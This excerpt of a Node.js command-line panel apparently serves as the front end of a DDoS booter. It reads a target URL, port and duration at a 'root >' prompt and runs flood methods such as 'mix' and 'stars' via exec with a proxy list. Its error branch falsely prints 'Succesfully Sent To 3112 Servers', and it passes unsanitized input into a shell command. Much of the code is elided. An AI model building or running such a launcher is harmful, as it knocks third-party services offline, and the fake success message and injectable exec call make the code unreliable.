...
const promptUser = () => {
  ...
  rl.question(redBg + '\x1b[37mroot\x1b[0m > ', (answer) => {
    ...
    if (command.toLowerCase() === 'exit') {
      ...
      if (url && time && port) {
        exec(`node mix.js ${url} ${time} 64 1 proxy.txt`, (error, stdout, stderr) => {
          if (error) {
            console.error(`Succesfully Sent To 3112 Servers`);
            promptUser();
            return;
          }
          if (stderr) {
  ...
  Attack Details:
    ...
    `);
        ...
        console.log('Example mix <ip> <port> <time>');
        promptUser();
      }
    } else if (command.toLowerCase() === 'stars') {
      if (url && time && port) {
  ...
  Attack Details:
    ...
    `);
        ...
        console.log('Example stars<ip> <port> <time>');
        promptUser();
      }
    } else {
